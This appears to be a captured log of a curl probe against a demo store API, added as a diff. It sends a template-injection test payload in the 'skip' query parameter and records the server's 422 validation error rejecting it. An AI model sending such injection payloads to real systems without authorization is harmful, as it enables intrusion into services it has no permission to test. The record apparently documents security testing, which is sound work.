@@ -1,0 +1,7 @@
+# command: timeout 20 curl -s -m 18 -o - -w '\nHTTP_STATUS:%{http_code}\nCTYPE:%{content_type}' 'https://duck-store.escape.tech/api/v1/reviews/product/1?skip=%7B%7B163%2A465%7D%7D%24%7B163%2A465%7D%23%7B163%2A465%7D%3C%25%3D163%2A465%25%3E'
+# exit_code: 0
+# ---
+
+{"detail":[{"type":"int_parsing","loc":["query","skip"],"msg":"Input should be a valid integer, unable to parse string as an integer","input":"{{163*465}}${163*465}#{163*465}<%=163*465%>"}]}
+HTTP_STATUS:422
+CTYPE:application/json
